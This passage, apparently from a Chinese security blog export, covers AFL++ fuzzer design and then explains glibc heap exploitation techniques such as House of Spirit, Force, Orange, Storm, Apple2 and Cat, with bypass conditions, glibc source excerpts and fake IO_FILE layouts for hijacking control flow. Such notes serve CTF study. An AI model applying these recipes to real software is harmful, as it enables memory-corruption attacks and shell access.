class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">A[插桩] --&gt; B[初始化队列]</span><br><span class=\"line\">B --&gt; C[突变]</span><br><span class=\"line\">C --&gt; D[输入程序]</span><br><span class=\"line\">D --&gt; E[检测运行结果]</span><br><span class=\"line\">E --&gt; F[更新队列]</span><br><span class=\"line\">F --&gt; G[记录crash]</span><br><span class=\"line\">G --&gt; C</span><br></pre></td></tr></table></figure>\n\n<p><strong>数据流：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">A[初始测试集] --&gt;|文件集| B</span><br><span class=\"line\">B[队列] --&gt;|文件| C</span><br><span class=\"line\">C[变异引擎] --&gt;|突变文件| D[程序]</span><br><span class=\"line\">D --&gt;|运行结果| F[检测引擎]</span><br><span class=\"line\">F --&gt;|突变文件 if 更新了覆盖范围| B</span><br><span class=\"line\">F --&gt;|crash文件| G[记录crash]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>对AFL++而言，生成随机数据的部分，即<strong>变异引擎</strong>是最重要的部分。</p>\n<h2 id=\"Fuzzer的结构\"><a href=\"#Fuzzer的结构\" class=\"headerlink\" title=\"Fuzzer的结构\"></a>Fuzzer的结构</h2><p>先从最简单的Fuzzer开始：</p>\n<ul>\n<li>变异引擎：用于根据原有的文件产生新的文件（一般以数据的形式进行变异）</li>\n<li>控制模块：<ul>\n<li>存储Fuzzer的重要参数</li>\n<li>控制Fuzzer不断工作<ul>\n<li>给程序输入数据</li>\n<li>判断程序接受输入后的结果</li>\n<li>根据运行结果执行不同的操作</li>\n</ul>\n</li>\n<li>显示Fuzzer的运行状态</li>\n</ul>\n</li>\n</ul>\n<p>这应该是最基本的Fuzzer结构。</p>\n<p>当然在此基础之上有许多值得优化的部分：</p>\n<ul>\n<li>引入灰盒测试思想（插桩之类的技术）</li>\n<li><strong>变异引擎的变异策略（最重要的）</strong></li>\n<li>结合<strong>生成式</strong>的策略</li>\n<li>对<code>crash</code>的区分和描述</li>\n<li>…</li>\n</ul>\n<h2 id=\"Fuzzer性能的衡量标准\"><a href=\"#Fuzzer性能的衡量标准\" class=\"headerlink\" title=\"Fuzzer性能的衡量标准\"></a>Fuzzer性能的衡量标准</h2><p>要判断对Fuzzer的改进是否有效，我们需要知道怎样的Fuzzer是一个好的Fuzzer，这需要一些指标去评价一个Fuzzer。</p>\n<ul>\n<li>一次fuzzing所需时间</li>\n<li><code>crash</code>产生的速率</li>\n<li>路径覆盖率</li>\n<li>覆盖率粒度</li>\n<li>…</li>\n</ul>"},{"title":"House of XXX","date":"2023-01-01T16:01:30.000Z","_content":"堆的进阶利用，各种House层出不穷，但都是在基本的attck的基础上进行的。\n<!--more-->\n\n### House of Spirit\n\nHouse of Spirit是一种针对fast bin的利用，通过在目标位置**伪造**fastbin chunk，并让其被释放，从而达到**申请指定地址内存**的目的。\n\n需要做的就是让目标位置能够被当作一个chunk释放，重点在于**修改指定地址前后的内容使其能绕过free的检测**。\n\n需要的绕过：\n\n- fake chunk的**ISMMAP位不能为1**，因为 free 时，如果是mmap的chunk，会单独处理。\n- fake chunk**地址需要对齐**。\n- fake chunk的**size大小需要满足对应的fastbin** 的需求，同时也得**对齐**。\n- fake chunk的next chunk的大小**不能小于2 * SIZE_SZ**，同时也**不能大于av->system_mem** 。\n- fake chunk对应的fastbin**链表头部不能是该fake chunk**，即不能构成double free的情况。\n\n### House of Force\n\nHouse of Force是一种针对**top chunk**的利用，当bin中所有的free chunk都不能满足需求时，就会从top chunk中切割，只要切割后top chunk size> MINSIZE，那么就可以切割top chunk分配。\n\n如果我们能通过一些方法**控制top chunk的size和我们申请的chunk的大小**，那么只要将**top chunk size修改为一个足够大的值**(如-1,unsigned long的最大值)，那么无论多大的size，我们都能分配到，由此实现**任意地址分配**。\n\n利用条件：\n\n- 可以控制top chunk的size\n- 可以控制申请chunk的大小\n\n### House of Einherjar\n\nHouse of Einherjar是一种针对**后向合并**操作的利用。当一个chunk被释放时，free会首先会利用prev_inuse位检查其物理低地址的chunk是否空闲，如果空闲则会将这两个chunk合并，**利用当前chunk P的指针、prev_size字段和size字段得到新的chunk的地址以及其大小**。\n\n因此如果我们能**控制prev_size字段和prev_inuse位**，那么我们就可以将新的chunk指向几乎任何位置。而堆溢出、off by one(null)都可以达到这个条件。\n\n值得注意的是，在合并取出前一个chunk的时候会用到**unlink**，因此需要提前构造好fake chunk来绕过unlink的检查。\n\n在这里unlink的检查中主要要注意的是：\n\n```c\n//检查prev_size和size是否一致\nif (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \n      malloc_printerr (\"corrupted size vs. prev_size\");     \n\n//检查fd和bk\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \n  malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \n\n```\n\n由于unlink中是利用要取出的chunk P进行验证，因此之后构造fake chunk的next chunk的prev_size即可绕过第一个检查。\n\n不过无论什么情况，第二个检查则需要构造一下。\n\n在利用unlink的时候，我们的绕过方式是：\n\n```c\n*(fakeFD+0x18)==P==*(fakeBK+0x10)\n//等价于(64bit)\nP->fd=&P-0x18\nP->bk=&P-0x10\n```\n\n但在这里我们可能不能获取到P的地址，所以我们换个方式:\n\n```c\nP->fd=P\nP->bk=P\n```\n\n同样可以绕过unlink的检查。\n\n值得注意的地方：\n\n- 需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。\n- 我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。\n- 我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。\n\n### House of Lore\n\nHouse of Lore好像没什么例子，可能比较少见吧。House of Lore可以实现分配任意指定位置的chunk，从而修改任意地址的内存。利用的前提是需要**控制Small Bin Chunk的bk指针**，并且**控制指定位置chunk的fd指针**。\n\n主要利用的是small bin中的漏洞。\n\n```c\n// 获取 small bin 中倒数第二个 chunk 。\nbck = victim->bk;\n// 检查 bck->fd 是不是 victim，防止伪造\nif (__glibc_unlikely(bck->fd != victim)) {\n  errstr = \"malloc(): smallbin double linked list corrupted\";\n  goto errout;\n  \n// 设置 victim 对应的 inuse 位\nset_inuse_bit_at_offset(victim, nb);\n// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来\nbin->bk = bck;\nbck->fd = bin;\n```\n\n当malloc的时候，如果申请的范围在small bin chunk内，且需要从small bin获取空闲的chunk时，会执行上面的语句。我们可以发现，如果我们能控制一个small bin chunk的bk指针指向fake chunk，并控制**fake chunk的fd指向该small bin chunk**来绕过检查，那么就可以将这个fake chunk放入small bin，下一次申请就可以申请到fake chunk1。\n\n### House of Orange\n\nHouse of Orange核心就是**通过漏洞利用获得free的效果**（在没有free的程序中）。\n\n原理是当前堆的**top chunk尺寸不足**以满足申请分配的大小的时候，**原来的top chunk会被释放并被置入unsorted bin中**，通过这一点可以在没有free函数情况下获取到 unsorted bins。此时会**执行sysmalloc来向系统申请更多的空间**。但是对于堆来说有mmap和brk两种分配方式，我们需要**让堆以brk的形式拓展**，之后原有的top chunk会被置于unsorted bin中。\n\n为了达到目的，我们伪造top chunk size绕过一些检查。\n\n- 伪造的 size 必须要对齐到内存页(0x1000)\n- size 要大于 MINSIZE(0x10)\n- size 要小于之后申请的 chunk size + MINSIZE(0x10)\n- size 的 prev inuse 位必须为 1\n\n当然malloc申请的size也有要求：malloc 的尺寸不能大于mmp_.mmap_threshold（默认128K）\n\ntop chunk size的对齐，top chunk addr + top chunk size后是一个4K对齐的地址（默认页面大小为4K，以4K对齐），因此伪造的top chunk size也要满足此条件，因此只能在原来的基础上增减4K的倍数。\n\nHouse of Orange的进一步利用与IO_FILE有关，后续再说。\n\n### House of Roman\n\nHouse of Roman是fast bin attack和unsorted bin attack的结合。该技术用于bypass ALSR（即使有PIE也依旧有效），利用12-bit的爆破来达到获取shell的目的。且仅仅只需要**一个UAF漏洞以及能创建任意大小的chunk**的情况下就能完成利用。常用在没有泄露的程序中。\n\n主要步骤为：\n\n1. 利用unsorted bin进行低地址覆盖，利用fastbin attack将fd指向malloc_hook-0x23来获取__malloc_hook（爆破）\n\n2. 利用unsorted bin attack修改malloc_hook为main_arena\n\n3. 利用之前获得的malloc_hook进行低位覆盖，修改malloc_hook为one_gadget\n\n### House of Rabbit\n\n一种在fast bin中伪造堆块的技术。其利用的是在进行malloc_consolidate时，fast bin中的堆块合并的过程中没有检查size。\n\n在chunk释放后，通过修改size构造fake chunk或修改fd指向fake chunk，之后通过malloc一个很大的内存，触发malloc_consolidate，由于这个过程中没有对size进行检查，因此fast bin中的chunk会放到对应的small bin中，伪造的fake chunk就变得合法了，由此可以实现overlapping\n\n不过需要伪造一下next chunk的prev_inuse=1和next next chunk的prev_inuse=1。\n\n### House of Corrosion\n\nHouse of Corrosion利用了**`global_max_fast`**这个libc中的全局变量，`global_max_fast`表示最大的fastbin chunk的大小，默认为`0x80`，在没有初始化堆的情况下为`0`。改写`globla_max_fast`可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。\n\n`fastbinsY`中有10个元素，存放大小从`0x20~0xb0`的chunk，当超出该范围的chunk进入`fastbinsY`时，就会发生**数组越界**。利用此方法我们可以向`fastbinsY`后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。\n\n偏移和要处理的`chunk size`可以用此式子计算：`chunk size = (address-fastbinsY)* 2 + 0x20`（这个size包括了`header`），其中`chunk size`是处理的`chunk`的`size`，`address`是会写入或`malloc`的地址，`fastbinsY`为`fastbinsY`的地址。\n\n1. `free`的利用：\n\n    利用`free`将`chunk`放入`fastbinsY`时的数组越界。当`global_max_fast`被修改变大后，更大的`chunk`被视为`fast bin chunk`，会被放入`fastbinsY`，如果大小超出`0xb0`，就会将后面对应的内存视作`fastbinsY`的一项放入，表现出的结果就是**将释放的`chunk`的堆地址写入该内存**。\n\n    值得注意的是，本质上这次写入是`fast bin chunk`进入`fast bin`的结果，因此该`chunk`的**`fd`位置会保存该内存处原有的指针，`chunk`的内容会被清空**。\n\n2. `malloc`的利用：\n\n    `malloc`时更大的`chunk`被视作`fast bin`，因此首先在`fastbinsY`中对应的`fast bin`中取出`chunk`，如果大小超出`0xb0`，自然就会越界，在后面的内存中取出`chunk`。取出时，会**判断后面内存中指针对应的`chunk`的`size`字段是否符合该`fast bin`的大小，如果符合则可以取出**。\n\n### House of  Storm\n\nHouse_of_storm 可以**在任意地址写出chunk地址,进而把这个地址的高位当作size,可以进行任意地址分配chunk**，也就是可以造成任意地址写。House_of_storm 虽然危害之大，但是其条件也是非常的苛刻。\n\n条件：\n\n1. glibc版本小于2.30,因为2.30之后加入了检查\n2. 需要攻击者在 large_bin 和 unsorted_bin 中分别布置一个chunk 这两个chunk需要在**归位之后处于同一个 largebin 的index中且 unsorted_bin 中的chunk要比 large_bin 中的大**\n3. unsorted bin中的bk指针要可控\n4. large bin中的bk和bk_nextsize指针要可控\n\n漏洞发生在unsorted bin chunk放入large bin的过程中。\n\n```c\n//unsorted bin attack\n//我们控制unsorted_chunk->bk = fake_chunk\n\n//unsorted_chunks(av)->bk = fake_chunk\nunsorted_chunks(av)->bk = unsorted_chunk->bk;\n//fake_chunk+0x10 = unsorted_bin\nbck->fd = unsorted_chunks(av);\n\n//放入fast bin的过程中\n            else \n            {\n                /*\n                \t如果unsorted_chunk->size 大于 largbin_chunk->size，\n                \t把unsorted_chunk加入到纵向链表中\n                \t我们控制\n                \tlarge_chunk->bk = fake_chunk+0x8 \n                \tlarge_chunk->bk_nextsize=fake_chunk-0x18-5\t\n                  -5是因为堆地址常常是0x55或者0x56开头的，-5后可以将其写入size位，而0x56的size可以绕过malloc的检查申请出来\n                */\n                \n                 \n                unsorted_chunk->fd_nextsize = largbin_chunk;\n                \n                //unsorted_chunk->bk_nextsize = fake_chunk-0x18-5\n                unsorted_chunk->bk_nextsize = largbin_chunk->bk_nextsize;\n                \n                largbin_chunk->bk_nextsize = unsorted_chunk;\n                \n                //fake_chunk+0x3 = unsorted_chunk\n                unsorted_chunk->bk_nextsize->fd_nextsize = unsorted_chunk;\n            }\n            //bck  = fake_chunk+0x8\n            bck = largbin_chunk->bk;\n        }\n    } \n\nmark_bin(av, unsorted_chunk_index); //把unsorted_chunk加入到的bin的表示为非空\n//把unsorted_chunk加入到large bin的链表中\n\nunsorted_chunk->bk = bck;\nunsorted_chunk->fd = largbin_chunk;\nlargbin_chunk->bk = unsorted_chunk;\n//fake_chunk+0x18 = unsorted_chunk\nbck->fd = unsorted_chunk;\n```\n\n具体利用：\n\n1. 将unsorted bin chunk的bk指向为fake chunk\n2. 将large bin中的bk指针指向fake chunk+0x8，bk_nextsize指向fake chunk-0x18-5（如果target为要写入的目标地址，则fake chunk为target-0x20），来实现victim->bk_nextsize->fd_nextsize=victim(实现fake chunk+3=victim) \n3. 通过malloc(0x48)获得fake chunk,借此可以修改target处的内容\n\n```c\nunsorted_bin_chunk->bk=fake_chunk\nlarge_bin_chunk->bk=fake_chunk+0x8\nlarge_bin_chunk->bk_nextsize=fake_chunk-0x18-5\n```\n\n其原理相当于利用large bin将一个堆地址写入任意地址，通过堆地址高位的0x56绕过检测，并将该fake chunk链入unsorted bin，从而实现任意地址malloc。\n\n### House of Kiwi\n\n\n\n\n\n### House of Emma\n\n\n\n### House of Pig\n\nHouse of Pig 是一个将 Tcache Statsh Unlink+ Attack 和 FSOP 结合的攻击，同时使用到了 Largebin Attack 进行辅助。主要适用于 libc 2.31 及以后的新版本 libc 并且程序中仅有 calloc 时。\n\n需要存在 UAF。能执行 abort 流程或程序显式调用 exit 或程序能通过主函数返回。\n\n利用流程为\n\n1. 进行一个 Tcache Stash Unlink+ 攻击，把地址 __free_hook - 0x10 写入 tcache_pthread_struct。由于该攻击要求__free_hook - 0x8 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。\n\n2. 再进行一个 large bin attack，修改 _IO_list_all 为一个堆地址，然后在该处伪造 _IO_FILE 结构体。\n\n3. 通过伪造的结构体触发 _IO_str_overflow getshell。\n\n### House of Banana\n\n从glibc 2.28开始，_int_malloc中增加了对unsorted bin的bk的校验，使得unsorted bin attack变得不可行。此时，我们可以考虑使用large bin attack，使用house of strom实现任意地址分配；然而，从glibc2.29开始，检查变得更加严格，house of strom不能用了。不过large bin attack仍可以使用，然而从glibc 2.30开始，常规large bin attack方法也被封堵，不过也能使用。\n\n### House of  Apple\n\nHouse of Apple在仅使用一次`largebin attack`并限制读写次数的条件下进行`FSOP`利用，前提均是已经泄露出`libc`地址和`heap`地址。\n\n使用`house of apple`的条件为：\n\n1. 程序从`main`函数返回或能调用`exit`函数（触发调用链`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_OVERFLOW`)\n2. 能泄露出`heap`地址和`libc`地址\n3. 能使用一次`largebin attack`（FSOP劫持`_IO_list_all`到伪造的`IO_FILE`结构体)\n\n在劫持IO后我们仍可以继续利用某些`IO`流函数去修改其他地方的值。就离不开`IO_FILE`的一个成员`_wide_data`的利用，其在`IO_FILE`中的偏移是`0xa0`。通过对伪造`_wide_data`并将vtable修改为`_IO_wstrn_jumps`，通过exit函数触发调用链`exit->fcloseall->_IO_cleanup->_IO_flush_all_lockp->_IO_OVERFLOW`，实现任意地址写已知（堆）地址（详情见IO_FILE）。\n\nHouse of Apple有四种利用思路：\n\n1. 修改tcache线程变量为已知值，控制tcache bin的分配。\n2. 修改`mp_.tcache_bins`为很大的值，使得很大的`chunk`也通过`tcachebin`去管理。\n3. 修改`tls`结构体`pointer_guard`的值为已知值，走House of emma。\n4. 修改`global_max_fast`全局变量，让大的chunk也能被认为是fast bin chunk。\n\n可以看到House of Apple主要还是利用`_wide_data`和`_IO_wstrn_jumps`中的`_IO_OVRFLOW`实现**任意地址写已知地址**，用以辅助其他方法劫持程序流。\n\n### House of  Apple2\n\nHouse of Apple2也是基于劫持`_wide_data`的利用，与House of Apple的区别在只劫持`_wide_data`的条件能控制程序的执行流。\n\n使用`house of apple2`的条件为：\n\n- 已知`heap`地址和`glibc`地址\n- 能控制程序执行`IO`操作，包括但不限于：从`main`函数返回、调用`exit`函数、通过`__malloc_assert`触发\n- 能控制`_IO_FILE`的`vtable`和`_wide_data`，一般使用`largebin attack`去控制\n\n这次主要利用的是`_IO_wide_data`中的`_wide_vtable`，这也是一个虚表，某些函数的执行会调用到其中的函数，调用过程如下：\n\n```c\n#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)\n \n#define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1)\n \n#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n \n#define _IO_WIDE_JUMPS(THIS) \\\n  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable\n```\n\n可以看到这里并**没有对vtable的合法性进行检测**。因此，我们可以劫持`IO_FILE`的`vtable`为`_IO_wfile_jumps`，控制`_wide_data`为可控的堆地址空间，进而控制`_wide_data->_wide_vtable`为可控的堆地址空间。控制程序执行`IO`流函数调用，最终调用到`_IO_Wxxxxx`函数即可控制程序的执行流。\n\n利用思路：\n\n目前在`glibc`源码中搜索到的`_IO_WXXXXX`系列函数的调用只有`_IO_WSETBUF`、`_IO_WUNDERFLOW`、`_IO_WDOALLOCATE`和`_IO_WOVERFLOW`。其中`_IO_WSETBUF`和`_IO_WUNDERFLOW`目前无法利用或利用困难，其余的均可构造合适的`_IO_FILE`进行利用。\n\n（1）利用`_IO_wfile_overflow`控制程序执行流（走`_IO_WDOALLOCATE`）\n\n以下利用的前提是要从`_IO_flush_all_lockp`执行`_IO_overflow(fp)`，因此伪造的IO_FILE需要满足以下条件：\n\n1. `fp->_mode<=0`\n2. `fp->_IO_write_ptr > fp->_IO_write_base`\n\n调用链如下：\n\n```c\n_IO_wfile_overflow\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp->_wide_data->_wide_vtable + 0x68)(fp)\n```\n\n在`_IO_wfile_overflow`中需要绕过一些检测，使其成功调用`_IO_wdoallocbuf`。\n\n```c\nwint_t _IO_wfile_overflow (FILE *f, wint_t wch)\n{\n  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */\n    {\n      f->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return WEOF;\n    }\n  /* If currently reading or no buffer allocated. */\n  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)\n    {\n      /* Allocate a buffer if needed. */\n      if (f->_wide_data->_IO_write_base == 0)\n    {\n      _IO_wdoallocbuf (f);// 需要走到这里\n      // ......\n    }\n    }\n}\n```\n\n需要满足`_flags & _IO_NO_WRITES==0`，`_flags & _IO_CURRENTLY_PUTTING==0`和`_wide_data->_IO_write_base == 0`。\n\n在`_IO_wdoallocbuf`函数中需要使其调用\n\n```c\nvoid _IO_wdoallocbuf (FILE *fp)\n{\n  if (fp->_wide_data->_IO_buf_base)\n    return;\n  if (!(fp->_flags & _IO_UNBUFFERED))\n    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)// _IO_WXXXX调用，需要走到这里\n      return;\n  _IO_wsetb (fp, fp->_wide_data->_shortbuf,\n             fp->_wide_data->_shortbuf + 1, 0);\n}\nlibc_hidden_def (_IO_wdoallocbuf)\n```\n\n需要满足`_wide_data->_IO_buf_base==0`和`_flags & _IO_UNBUFFERED==0`。\n\n综上需要对伪造的IO_FILE进行一下设置：\n\n- `_flags`设置为`~(2 | 0x8 | 0x800)`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为`  sh;`，注意前面有两个空格\n- `vtable`设置为`_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_overflow`即可\n- `fp->_mode<=0`\n- `fp->_IO_write_ptr > fp->_IO_write_base`\n- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`\n- `_wide_data->_IO_write_base`设置为`0`，即满足`*(A + 0x18) = 0`\n- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`\n- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`\n- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`\n\n（2）利用`_IO_wfile_underflow_mmap`控制程序执行流（走`_IO_WDOALLOCATE`）\n\n调用链如下：\n\n```c\n_IO_wfile_underflow_mmap\n    _IO_wdoallocbuf\n        _IO_WDOALLOCATE\n            *(fp->_wide_data->_wide_vtable + 0x68)(fp)\n```\n\n在`_IO_wfile_underflow_mmap`中需要绕过一些检测，使其成功调用`_IO_wdoallocbuf`。\n\n```c\nstatic wint_t _IO_wfile_underflow_mmap (FILE *fp)\n{\n  struct _IO_codecvt *cd;\n  const char *read_stop;\n \n  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))\n    {\n      fp->_flags |= _IO_ERR_SEEN;\n      __set_errno (EBADF);\n      return WEOF;\n    }\n  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)\n    return *fp->_wide_data->_IO_read_ptr;\n \n  cd = fp->_codecvt;\n \n  /* Maybe there is something left in the external buffer.  */\n  if (fp->_IO_read_ptr >= fp->_IO_read_end\n      /* No.  But maybe the read buffer is not fully set up.  */\n      && _IO_file_underflow_mmap (fp) == EOF)\n    /* Nothing available.  _IO_file_underflow_mmap has set the EOF or error\n       flags as appropriate.  */\n    return WEOF;\n \n  /* There is more in the external.  Convert it.  */\n  read_stop = (const char *) fp->_IO_read_ptr;\n \n  if (fp->_wide_data->_IO_buf_base == NULL)\n    {\n      /* Maybe we already have a push back pointer.  */\n      if (fp->_wide_data->_IO_save_base != NULL)\n    {\n      free (fp->_wide_data->_IO_save_base);\n      fp->_flags &= ~_IO_IN_BACKUP;\n    }\n      _IO_wdoallocbuf (fp);// 需要走到这里\n    }\n    //......\n}\n```\n\n需要满足`_flags & _IO_NO_READS == 0`，`_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`和`_IO_read_ptr < _IO_read_end`绕过前面的return。设置`_wide_data->_IO_buf_base == NULL`和`_wide_data->_IO_save_base == NULL`调用`_IO_wdoallocbuf (fp)`。\n\n综上需要对伪造的IO_FILE进行一下设置：\n\n- `_flags`设置为`~4`，如果不需要控制`rdi`，设置为`0`即可；如果需要获得`shell`，可设置为`sh;`，注意前面有个空格\n- `vtable`设置为`_IO_wfile_jumps_mmap`地址（加减偏移），使其能成功调用`_IO_wfile_underflow_mmap`即可\n- `_IO_read_ptr < _IO_read_end`，即满足`*(fp + 8) < *(fp + 0x10)`\n- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`\n- `_wide_data->_IO_read_ptr >= _wide_data->_IO_read_end`，即满足`*A >= *(A + 8)`\n- `_wide_data->_IO_buf_base`设置为`0`，即满足`*(A + 0x30) = 0`\n- `_wide_data->_IO_save_base`设置为`0`或者合法的可被`free`的地址，即满足`*(A + 0x40) = 0`\n- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`\n- `_wide_data->_wide_vtable->doallocate`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x68) = C`\n\n（3）利用`_IO_wdefault_xsgetn`控制程序执行流（走`_IO_WOVERFLOW`）\n\n```c\n_IO_wdefault_xsgetn\n    __wunderflow\n        _IO_switch_to_wget_mode\n            _IO_WOVERFLOW\n                *(fp->_wide_data->_wide_vtable + 0x18)(fp)\n```\n\n在`_IO_wdefault_xsgetn`中需要绕过一些检测，使其成功调用`__wunderflow`。\n\n```c\nsize_t _IO_wdefault_xsgetn (FILE *fp, void *data, size_t n)\n{\n  size_t more = n;\n  wchar_t *s = (wchar_t*) data;\n  for (;;)\n    {\n      /* Data available. */\n      ssize_t count = (fp->_wide_data->_IO_read_end\n                       - fp->_wide_data->_IO_read_ptr);\n      if (count > 0)\n    {\n      if ((size_t) count > more)\n        count = more;\n      if (count > 20)\n        {\n          s = __wmempcpy (s, fp->_wide_data->_IO_read_ptr, count);\n          fp->_wide_data->_IO_read_ptr += count;\n        }\n      else if (count <= 0)\n        count = 0;\n      else\n        {\n          wchar_t *p = fp->_wide_data->_IO_read_ptr;\n          int i = (int) count;\n          while (--i >= 0)\n        *s++ = *p++;\n          fp->_wide_data->_IO_read_ptr = p;\n            }\n            more -= count;\n        }\n      if (more == 0 || __wunderflow (fp) == WEOF) //进入这里\n    break;\n    }\n  return n - more;\n}\nlibc_hidden_def (_IO_wdefault_xsgetn)\n```\n\n需要满足`_wide_data->_IO_read_end - _wide_data->_IO_read_ptr== 0`不进入第一个if。之后需要`mode!=0`调用`__wunderflow(fp)`。\n\n之后要进入`_IO_switch_to_wget_mode`\n\n```c\nwint_t __wunderflow (FILE *fp)\n{\n  if (fp->_mode < 0 || (fp->_mode == 0 && _IO_fwide (fp, 1) != 1))\n    return WEOF;\n \n  if (fp->_mode == 0)\n    _IO_fwide (fp, 1);\n  if (_IO_in_put_mode (fp))\n    if (_IO_switch_to_wget_mode (fp) == EOF) //进入这里\n      return WEOF;\n    // ......\n}\n```\n\n需要满足`mode>0`（前面已经让mode!=0）绕过第一个if。之后需要`_flags & _IO_CURRENTLY_PUTTING != 0`，调用`_IO_switch_to_wget_mode`。\n\n最后真正进入`_IO_WXXXX`\n\n```c\nint _IO_switch_to_wget_mode (FILE *fp)\n{\n  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)\n    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里\n      return EOF;\n    // .....\n}\n```\n\n需要满足`_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`调用`_IO_WOVERFLOW`。\n\n综上需要对伪造的IO_FILE进行一下设置：\n\n- `_flags`设置为`0x800`\n- `vtable`设置为`_IO_wstrn_jumps/_IO_wmem_jumps/_IO_wstr_jumps`地址（加减偏移），使其能成功调用`_IO_wdefault_xsgetn`即可\n- `_mode`设置为大于`0`，即满足`*(fp + 0xc0) > 0`\n- `_wide_data`设置为可控堆地址`A`，即满足`*(fp + 0xa0) = A`\n- `_wide_data->_IO_read_end == _wide_data->_IO_read_ptr`设置为`0`，即满足`*(A + 8) = *A`\n- `_wide_data->_IO_write_ptr > _wide_data->_IO_write_base`，即满足`*(A + 0x20) > *(A + 0x18)`\n- `_wide_data->_wide_vtable`设置为可控堆地址`B`，即满足`*(A + 0xe0) = B`\n- `_wide_data->_wide_vtable->overflow`设置为地址`C`用于劫持`RIP`，即满足`*(B + 0x18) = C`\n\n### House of Cat\n\nHouse of Cat利用了**_IO_wfile_jumps**中的**_IO_wfile_seekoff**函数，最后**_IO_switch_to_wget_mode**函数中来攻击，在**FSOP**的情况下也是可行的，只需修改虚表指针的偏移来调用**_IO_wfile_seekoff**即可（通常是结合**__malloc_assert**，改vtable为**_IO_wfile_jumps+0x10**）。\n\n调用链：`_IO_wfile_seekoff -> _IO_switch_to_wget_mode -> _IO_WOVERFLOW`\n\n`_IO_wfile_seekoff`如下：\n\n```c\noff64_t _IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)\n{\n  off64_t result;\n  off64_t delta, new_offset;\n  long int count;\n \n  if (mode == 0)\n    return do_ftell_wide (fp);\n  int must_be_exact = ((fp->_wide_data->_IO_read_base\n            == fp->_wide_data->_IO_read_end)\n               && (fp->_wide_data->_IO_write_base\n               == fp->_wide_data->_IO_write_ptr));\n#需要绕过was_writing的检测\n  bool was_writing = ((fp->_wide_data->_IO_write_ptr\n               > fp->_wide_data->_IO_write_base)\n              || _IO_in_put_mode (fp));\n \n  if (was_writing && _IO_switch_to_wget_mode (fp)) //进入_IO_switch_to_wget_mode\n    return WEOF;\n......\n}\n```\n\n`_IO_switch_to_wget_mode`如下：\n\n```c\nint _IO_switch_to_wget_mode (FILE *fp)\n{\n  if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)\n    if ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF) // 需要走到这里\n      return EOF;\n    // .....\n}\n```\n\n如果要利用`_IO_WOVERFLOW`，我们将其设置为`system`或者`one_gadget`，调用到这里就可以`get shell`。不过如果遇到了**开启沙箱**的情况，这种方法就不可行了，我们就要考虑其他方式。\n\n先看看`_IO_switch_to_wget_mode`调用`_IO_WOVERFLOW`的汇编代码：\n\n```asm\n0x7f4cae745d34 <_IO_switch_to_wget_mode+4>     mov    rax, qword ptr [rdi + 0xa0] \n;rdi==fp\n;rax=fp+0xa0==wide_data\n0x7f4cae745d3f <_IO_switch_to_wget_mode+15>    mov    rdx, qword ptr [rax + 0x20]\n;rdx=wide_data->_IO_write_ptr\n0x7f4cae745d49 <_IO_switch_to_wget_mode+25>    mov    rax, qword ptr [rax + 0xe0] ;rax=wide_data+0xe0==wide_data->vtable\n0x7f4cae745d55 <_IO_switch_to_wget_mode+37>    call   qword ptr [rax + 0x18] \n;call 